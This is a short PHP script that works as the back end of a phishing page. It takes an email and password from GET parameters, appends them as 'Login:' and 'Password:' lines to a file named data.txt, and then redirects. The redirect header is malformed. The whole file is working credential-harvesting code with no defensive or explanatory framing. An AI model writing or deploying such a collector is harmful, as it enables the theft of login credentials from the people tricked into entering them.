<?php 
/* Get fields: */
$login_field = "Login: " . $_GET["email"] . "\n";
$passwd_field = "Password: " . $_GET["pass"] . "\n";

/* Open datalist file: */
$file = fopen("data.txt", "a");

/* Write/Save */
$lwrite = fwrite($file, $login_field);
$pwrite = fwrite($file, $passwd_field);

/* Close file: */
fclose($file);

// echo "Error message."

/* Redirect: */
header("#")
?>
